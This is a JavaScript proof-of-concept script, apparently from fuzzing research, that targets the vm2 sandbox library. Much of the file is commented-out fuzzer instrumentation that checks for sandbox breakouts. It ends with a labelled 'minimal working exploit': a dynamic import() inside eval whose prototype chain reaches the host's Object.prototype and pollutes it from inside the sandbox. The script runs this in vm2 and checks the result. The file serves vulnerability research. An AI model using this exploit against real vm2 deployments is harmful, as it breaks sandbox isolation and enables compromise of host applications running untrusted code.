let code = `
/* DELETE HERE
let global = this;
let Test262Error = Error;
function isGetter(obj, prop) {
    return !!Object.getOwnPropertyDescriptor(obj, prop)['get'];
}
function isSetter(obj, prop) {
    return !!Object.getOwnPropertyDescriptor(obj, prop)['set'];
}
function getAllProperties(obj) {
    let allProps = [], curr = obj;
    try {
        do {
            let props = Object.getOwnPropertyNames(curr);
            props.forEach(function (prop) {
                if (allProps.indexOf(prop) === -1)
                    allProps.push(prop);
            });
        } while (curr = curr.__proto__);
    } catch (e) {
    }
    return allProps;
}
function getAllReferences(obj) {
    let visited = new WeakMap();
    if (!obj || typeof obj !== 'object' && typeof obj !== 'function')
        return [];
    visited.set(obj, true);
    function getRefsRecursive(obj, path) {
        let res = [];
        if (!obj)
            return res;
        if (typeof obj !== 'object' && typeof obj !== 'function')
            return res;
        let keys = getAllProperties(obj);
        for (let i = 0; i < keys.length; i++) {
            try {
                if (isGetter(obj, keys[i]) || isSetter(obj, keys[i]))
                    continue;
                let val = obj[keys[i]];
                if (val && !visited.has(val) && (typeof val === 'object' || typeof val === 'function')) {
                    let currPath = path + '.' + keys[i];
                    visited.set(val, true);
                    res.push({
                        path: currPath,
                        val: val
                    });
                    res = res.concat(getRefsRecursive(val, currPath));
                }
            } catch (e) {
                res.push(e);
            }
        }
        return res;
    }
    return getRefsRecursive(obj, 'ref');
}
function getRootConstructor(obj) {
    if (typeof obj !== 'object' && typeof obj !== 'function' || !obj.constructor) {
        return Object.constructor;
    }
    while (obj.constructor) {
        if (obj === obj.constructor) {
            break;
        }
        obj = obj.constructor;
    }
    return obj;
}
function getRootPrototype(obj) {
    
    stats.oracleChecks++;
    
    try {
        if (!obj)
            return Object.prototype;
        if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
            return Object.prototype;
        }
        while (obj.__proto__) {
            obj = obj.__proto__;
        }
        return obj;
    } catch (e) {
        return Object.prototype;
    }
}
function checkBreakout(x, path) {
   
    try {
        if (x === 'SandDriller-23420409')
            leak('SB-SUCCESS: The property ' + path + ' is able to read outside the sandbox');
        let dis = getRootConstructor(x)('return this;')();
        if (dis.flag === 'SandDriller-23420409')
            leak('SB-SUCCESS: The property ' + path + ' is able to read outside the sandbox');
        if (dis.process && dis.process.mainModule) {
            leak('SB-SUCCESS: The property ' + path + ' is able to call outside the sandbox');
        }
    } catch (DONOTINSTRUMENT) {
    }
}
function checkReferenceRecursive(ref, cb) {
    let stack = new Error().stack;
    var count = (stack.match(/checkReferenceRecursive/g) || []).length;
    if (count > 1) {
        return;
    }
    let rootPrototype = getRootPrototype(ref);
    if (rootPrototype !== Object.prototype) {
        cb(rootPrototype, 'ref');
    }
    checkBreakout(ref, 'ref');
    let refs = getAllReferences(ref);
    for (let i = 0; i < refs.length; i++) {
        let rootPrototype = getRootPrototype(refs[i].val);
        if (rootPrototype !== Object.prototype) {
            cb(rootPrototype, refs[i].path);
        }
        checkBreakout(refs[i].val, refs[i].path);
    }
}
*/

global.temp0 = (global.temp1 = eval(\`import('modules-skip-2.js');\`), function functionInvocationAnalysis(r) {
    /* REPLACED with line below
    let grtA = getRootPrototype(r);
    */
//Manually added code
   let grtA = r.__proto__.__proto__;
//END   
   if (grtA !== Object.__proto__) {
        try {
            grtA.FIA = 'FI: Got it?';
            Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 7]');
    }
    /* DELETE HERE
    checkReferenceRecursive(r, (root, path) => {
        try {
            root.FIA = 'FI: Got it?';
            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 7]');
    });
    */
}(temp1), global.temp1).then(console.log, () => {
    /* DELETE HERE
    if (typeof arguments !== 'undefined' && arguments.length > 0) {
        checkReferenceRecursive(arguments, (root, path) => {
            try {
                root.FEA = 'FE: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FEA-SUCCESS: The property ' + path + ' of arguments of function anonymous2 has a different root prototype [line 9]');
        });
    }
    let grtT = getRootPrototype(this);
    checkBreakout(this);
    if (grtT !== Object.__proto__) {
        try {
            grtT.FET = 'FE: Got it?';
            Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FET-SUCCESS: "this" object of function anonymous2 has a different root prototype [line 9]');
    }
    if (this)
        checkReferenceRecursive(this, (root, path) => {
            try {
                root.FET = 'FE: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FET-SUCCESS: The property ' + path + ' of this in function anonymous2 has a different root prototype [line 9]');
        });
    */
}), function functionInvocationAnalysis(r) {
    /* DELETE HERE
    let grtA = getRootPrototype(r);
    if (grtA !== Object.__proto__) {
        try {
            grtA.FIA = 'FI: Got it?';
            Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 7]');
    }
    */
    /* DELETE HERE
    checkReferenceRecursive(r, (root, path) => {
        try {
            root.FIA = 'FI: Got it?';
            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 7]');
    });
    */
}(temp0), global.temp0;

//DELETE BELOW
/*
global.temp2 = (global.temp3 = eval(\`eval(import('modules-skip-2.js'));\`), function functionInvocationAnalysis(r) {
    let grtA = getRootPrototype(r);
    if (grtA !== Object.__proto__) {
        try {
            grtA.FIA = 'FI: Got it?';
            Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 10]');
    }
    checkReferenceRecursive(r, (root, path) => {
        try {
            root.FIA = 'FI: Got it?';
            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 10]');
    });
}(temp3), global.temp3).then(console.log, () => {
    
    if (typeof arguments !== 'undefined' && arguments.length > 0) {
        checkReferenceRecursive(arguments, (root, path) => {
            try {
                root.FEA = 'FE: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FEA-SUCCESS: The property ' + path + ' of arguments of function anonymous7 has a different root prototype [line 12]');
        });
    }
    
    let grtT = getRootPrototype(this);
    checkBreakout(this);
    
    if (grtT !== Object.__proto__) {
        try {
            grtT.FET = 'FE: Got it?';
            Object.defineProperty(grtT, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FET-SUCCESS: "this" object of function anonymous7 has a different root prototype [line 12]');
    }
    
    if (this)
        checkReferenceRecursive(this, (root, path) => {
            try {
                root.FET = 'FE: Got it?';
                Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
            } catch (e) {
            }
            leak('FET-SUCCESS: The property ' + path + ' of this in function anonymous7 has a different root prototype [line 12]');
        });
    
}), function functionInvocationAnalysis(r) {
    let grtA = getRootPrototype(r);
    if (grtA !== Object.__proto__) {
        try {
            grtA.FIA = 'FI: Got it?';
            Object.defineProperty(grtA, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The result of function annonymous has a different root prototype [line 10]');
    }
    checkReferenceRecursive(r, (root, path) => {
        try {
            root.FIA = 'FI: Got it?';
            Object.defineProperty(root, 'FEA', { value: 'FE: Got it?' });
        } catch (e) {
        }
        leak('FIA-SUCCESS: The property ' + path + ' of the result of function annonymous has a different root prototype [line 10]');
    });
}(temp2), global.temp2;
*/
`;

//After delta debugging, the minimal working exploit will be as below
let minimizedCode = `
    p = eval(\`import('modules-skip-2.js');\`)
    p.__proto__.__proto__.polluted = 'polluted: Got it?';
`;

let leak = console.log;
let stats = {oracleChecks: 0}
let endows = {leak:leak, stats:stats}
const {VM} = require("vm2");
let vmInstance = new VM({sandbox:endows});

/* To test the code to minimise
vmInstance.run(code);
console.log(Object.prototype.p, {}.polluted, Object.prototype.FEA, Object.prototype.FET, Object.prototype.FIA, Object.prototype.FIT, Object.prototype.CCA, Object.prototype.CCT);
*/ 

vmInstance.run(minimizedCode);
console.log({}.polluted)